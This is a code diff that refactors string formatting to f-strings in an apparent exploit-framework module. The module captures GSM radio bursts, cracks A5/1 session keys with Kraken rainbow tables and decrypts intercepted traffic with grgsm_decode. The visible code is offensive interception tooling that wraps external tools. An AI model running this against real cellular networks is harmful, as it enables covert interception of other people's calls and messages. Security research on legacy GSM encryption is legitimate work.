@@ -162,18 +162,18 @@ class Exploit(Exploit):
 
         cmd_str = " ".join(cmd)
         if self.dry_run:
-            print_info("DRY RUN - {}".format(cmd_str))
+            print_info(f"DRY RUN - {cmd_str}")
             return
 
-        print_status("Capturing GSM bursts: {}".format(cmd_str))
-        print_info("Output: {}".format(outfile))
+        print_status(f"Capturing GSM bursts: {cmd_str}")
+        print_info(f"Output: {outfile}")
         print_info("Press Ctrl+C to stop capture.")
         try:
             subprocess.run(cmd, check=False)
         except KeyboardInterrupt:
             print_info("\nCapture stopped.")
         except Exception as exc:
-            print_error("Capture error: {}".format(exc))
+            print_error(f"Capture error: {exc}")
 
     def _crack_rainbow(self) -> None:
         kraken = str(self.kraken_path).strip() or _which("kraken")
@@ -201,13 +201,13 @@ class Exploit(Exploit):
         cmd_str = " ".join(cmd)
 
         if self.dry_run:
-            print_info("DRY RUN - {}".format(cmd_str))
+            print_info(f"DRY RUN - {cmd_str}")
             return
 
         print_status("Cracking A5/1 with Kraken rainbow tables")
-        print_info("Tables: {}".format(tables))
-        print_info("Burst file: {}".format(cap))
-        print_info("Command: {}".format(cmd_str))
+        print_info(f"Tables: {tables}")
+        print_info(f"Burst file: {cap}")
+        print_info(f"Command: {cmd_str}")
 
         try:
             result = subprocess.run(
@@ -216,21 +216,21 @@ class Exploit(Exploit):
             if result.returncode == 0:
                 print_success("Session key recovered!")
                 for line in result.stdout.strip().splitlines():
-                    print_info("  {}".format(line))
+                    print_info(f"  {line}")
 
                 outdir = self._outdir()
                 report = os.path.join(outdir, "a51_crack_result.txt")
                 with open(report, "w", encoding="utf-8") as fh:
                     fh.write(result.stdout)
-                print_info("Result saved: {}".format(report))
+                print_info(f"Result saved: {report}")
             else:
                 print_error("Kraken did not recover key.")
                 if result.stderr.strip():
-                    print_error("stderr: {}".format(result.stderr.strip()))
+                    print_error(f"stderr: {result.stderr.strip()}")
         except subprocess.TimeoutExpired:
             print_error("Kraken timed out (300s limit).")
         except Exception as exc:
-            print_error("Kraken error: {}".format(exc))
+            print_error(f"Kraken error: {exc}")
 
     def _crack_known_plaintext(self) -> None:
         cap = str(self.capture_file).strip()
@@ -244,7 +244,7 @@ class Exploit(Exploit):
             "Cipher Mode Command have predictable content that can be\n"
             "used as known plaintext to reduce A5/1 keystream search space."
         )
-        print_info("Burst file: {}".format(cap))
+        print_info(f"Burst file: {cap}")
         print_info(
             "Known-plaintext frames:\n"
             "  - System Information 5/6: broadcast on SACCH, predictable structure\n"
@@ -260,10 +260,10 @@ class Exploit(Exploit):
         outdir = self._outdir()
         report = os.path.join(outdir, "a51_known_plaintext_analysis.txt")
         with open(report, "w", encoding="utf-8") as fh:
-            fh.write("Known-plaintext analysis for: {}\n".format(cap))
+            fh.write(f"Known-plaintext analysis for: {cap}\n")
             fh.write("Predictable frame types: SI5, SI6, CMC, LAPDm fill\n")
             fh.write("Status: analysis framework ready, manual review required\n")
-        print_info("Analysis stub saved: {}".format(report))
+        print_info(f"Analysis stub saved: {report}")
 
     def _decrypt_bursts(self) -> None:
         kc = str(self.session_key).strip()
@@ -274,9 +274,7 @@ class Exploit(Exploit):
         kc_clean = kc.replace("0x", "").replace(" ", "")
         if len(kc_clean) != 16:
             print_error(
-                "Session key Kc must be 8 bytes (16 hex chars). Got: {} chars".format(
-                    len(kc_clean)
-                )
+                f"Session key Kc must be 8 bytes (16 hex chars). Got: {len(kc_clean)} chars"
             )
             return
 
@@ -285,8 +283,8 @@ class Exploit(Exploit):
             print_error("capture_file is required (encrypted burst data)")
             return
 
-        print_status("Decrypting GSM bursts with Kc={}".format(kc_clean))
-        print_info("Burst file: {}".format(cap))
+        print_status(f"Decrypting GSM bursts with Kc={kc_clean}")
+        print_info(f"Burst file: {cap}")
         print_info(
             "Process: generate A5/1 keystream from Kc + frame number,\n"
             "XOR with ciphertext to recover plaintext frames."
@@ -302,19 +300,19 @@ class Exploit(Exploit):
             ]
             cmd_str = " ".join(cmd)
             if self.dry_run:
-                print_info("DRY RUN - {}".format(cmd_str))
+                print_info(f"DRY RUN - {cmd_str}")
                 return
-            print_info("Command: {}".format(cmd_str))
+            print_info(f"Command: {cmd_str}")
             try:
                 result = subprocess.run(
                     cmd, capture_output=True, text=True, check=False,
                 )
                 if result.returncode == 0:
-                    print_success("Bursts decrypted: {}".format(outfile))
+                    print_success(f"Bursts decrypted: {outfile}")
                 else:
-                    print_error("Decode error: {}".format(result.stderr.strip()))
+                    print_error(f"Decode error: {result.stderr.strip()}")
             except Exception as exc:
-                print_error("Decode error: {}".format(exc))
+                print_error(f"Decode error: {exc}")
         else:
             print_info(
                 "grgsm_decode not found. Manual XOR decryption would be needed.\n"
